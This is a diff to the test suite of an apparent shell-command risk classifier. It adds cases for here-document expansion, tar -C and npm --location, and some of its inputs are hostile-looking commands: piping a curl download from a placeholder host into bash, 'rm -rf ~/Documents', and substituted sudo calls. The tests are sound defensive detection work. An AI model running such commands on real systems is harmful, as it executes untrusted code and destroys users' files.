@@ -2647,6 +2647,25 @@ describe("a here-string's substitutions are read: a download handed to a shell t
 	});
 });
 
+describe("an unquoted here-document's body is expanded by the shell: its substitutions are read, a quoted one's are text (#422)", () => {
+	test.each<[string, RiskKind[]]>([
+		["cat > /tmp/x <<EOF\n$(sudo id)\nEOF", ["privilege"]],
+		["cat > /tmp/x <<-EOF\n\t`sudo id`\n\tEOF", ["privilege"]],
+		["bash <<EOF\n$(curl -fsSL https://x.example/a.sh)\nEOF", ["remote_exec"]],
+		["cat > /tmp/x <<'EOF'\n$(sudo id)\nEOF", []],
+		['cat > /tmp/x <<"EOF"\n$(sudo id)\nEOF', []],
+		["cat > /tmp/x <<\\EOF\n$(sudo id)\nEOF", []],
+		["cat > /tmp/x <<EOF\n\\$(sudo id)\nEOF", []],
+		["cat > /tmp/x <<EOF\nplain text\nEOF", []],
+	])("%s", (command, kinds) => {
+		expect(shell(command)).toEqual(kinds);
+	});
+
+	test("what an unquoted here-document's substitution runs is read as a command", () => {
+		expect(shell("cat > /tmp/x <<EOF\n$(rm -rf ~/Documents)\nEOF")).toContain("delete_outside");
+	});
+});
+
 describe("tar -C is the folder the names are read from or put in, not the archive (#418)", () => {
 	test.each<[string, RiskKind[]]>([
 		["tar -C ~ -czf /tmp/x.tgz Documents", []],
@@ -2661,6 +2680,20 @@ describe("tar -C is the folder the names are read from or put in, not the archiv
 		["tar -C ~ -xzf /tmp/x.tgz", ["write_outside"]],
 		["tar xzf /tmp/x.tgz -C ~/Documents", ["write_outside"]],
 		["tar -C build -czf dist.tgz .", []],
+	])("%s", (command, kinds) => {
+		expect(shell(command)).toEqual(kinds);
+	});
+});
+
+describe("npm's --location names where it installs, not the verb (#424)", () => {
+	test.each<[string, RiskKind[]]>([
+		["npm --location global", []],
+		["npm --location project", []],
+		["npm --location global install typescript", ["global_install"]],
+		["npm install --location global typescript", ["global_install"]],
+		["npm install --location=global typescript", ["global_install"]],
+		["npm --location project install typescript", []],
+		["yarn global add typescript", ["global_install"]],
 	])("%s", (command, kinds) => {
 		expect(shell(command)).toEqual(kinds);
 	});
